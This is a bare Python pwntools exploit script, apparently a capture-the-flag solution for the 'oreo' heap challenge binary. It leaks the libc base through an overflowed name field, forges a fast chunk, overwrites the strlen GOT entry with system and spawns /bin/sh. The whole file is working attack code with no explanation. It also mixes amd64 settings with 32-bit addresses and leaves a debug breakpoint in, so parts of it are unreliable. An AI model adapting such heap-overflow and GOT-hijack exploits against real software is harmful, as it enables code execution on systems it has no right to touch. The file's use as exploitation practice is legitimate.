#! /usr/bin/env python3
from pwn import *

context(os='linux', arch='amd64', log_level='debug')
context.terminal = ['tmux','splitw','-h']
elf = ELF('./oreo1')
libc = ELF('libc.so.6')
# libc = elf.libc
p = process('./oreo1')

def create(des, name):
    # p.recvuntil('Action: ')
    p.sendline('1')
    # p.recvuntil('name: ')
    p.send(name)
    # p.recvuntil('description: ')
    p.send(des)

def show():
    # p.recvuntil('Action: ')
    p.sendline('2')
    p.recvuntil('===================================\n')

def delete():
    # p.recvuntil('Action: ')
    p.sendline('3')

def message(notice):
    # p.recvuntil('Action: ')
    p.sendline('4')
    p.sendline(notice)

def debug():
    gdb.attach(p)
    pause()

puts_got = elf.got['puts']
puts_plt = elf.plt['puts']
free_got = elf.got['free']
strlen_got = elf.got['strlen']

log.success('free_got: ' + hex(free_got))

# leak libc
create('789\n',b'a'*0x1b+p64(puts_got) + b'\n')

show()

p.recvuntil('Description: ')
p.recvuntil('Description: ')
puts_addr = u64(p.recvuntil(b'\xf7')[-4:].ljust(8, b'\x00'))
log.success('puts_addr: ' + hex(puts_addr))

libc.address = puts_addr - libc.sym['puts']
log.success('libc.address: ' + hex(libc.address))

system_addr = libc.sym['system']
log.success('system_addr: ' + hex(system_addr))

debug()
# hijack_got
num = 2
while num != 0x41:
    num+=1
    create('aaa\n',b'bbb' + b'\n')

create('789\n',b'a'*0x1b+p64(0x804A2A8) + p8(0x41) + b'\n')


message(0x24*b'\x00' + p32(0x11))#* 0x11防止 free(): invalid next size (fast): 0x0804a2a8 ***

delete()

create(p64(strlen_got)+b'\n','789\n')


message(p32(system_addr)+b';/bin/sh\x00\n')

p.interactive()
